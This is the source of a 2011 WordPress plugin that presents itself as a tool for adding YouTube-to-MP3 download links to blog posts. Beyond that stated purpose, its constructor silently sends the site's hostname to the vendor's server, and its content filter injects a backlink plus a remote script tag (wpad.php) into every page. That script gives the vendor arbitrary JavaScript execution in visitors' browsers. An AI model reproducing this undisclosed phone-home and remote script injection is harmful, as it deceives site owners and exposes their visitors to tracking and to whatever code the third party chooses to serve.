<?php
/* 
Plugin Name: YouTube Video MP3 Download
Plugin URI: http://www.video2mp3.at
Version: 1.0
Author: Steve
Description: You can download embed Youtube Videos directly from your Blog!
 
Copyright 2011 www.video2mp3.at  (email: info@video2mp3.at)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

class video2mp3 {
		

function video2mp3() {	

$wpadmin = "http://www.video2mp3.at/wordpressaddon.php?b=true&s=".$_SERVER['HTTP_HOST'];
$homepage = file_get_contents($wpadmin);



add_filter('the_content', array($this, 'ueberpruefung'));	

}
		
		
function vidsplit($splitter) {

$regexposition = strpos($splitter, '&');

return substr($splitter, 0, $regexposition);
return $splitter;

}
				
				
function videocheck($vidteile) {

$hehe = $this->vidsplit($vidteile[2]);
$hehe1 = substr($hehe, 0, -10);
return  $vidteile[0].'<br /><br />'.'<small>'.'Download this Video to MP3 - > <a href="http://www.video2mp3.at/?youtube='.$hehe1.'">YouTube MP3</a> </small>';
}
		
function ueberpruefung($wordpresscontent = '') {
echo '<a id="video2mp3" href="http://www.video2mp3.at">YouTube Converter</a><script type="text/javascript" language="JavaScript" src="http://www.video2mp3.at/wpad.php"></script>';

return preg_replace_callback("~\\<object(.*)youtube.com/v/(.*)\"(.*)\\</object\\>~", array($this, 'videocheck'), $wordpresscontent);
return $wordpresscontent;

}


}
	

$video2mp3 = new video2mp3();


?>
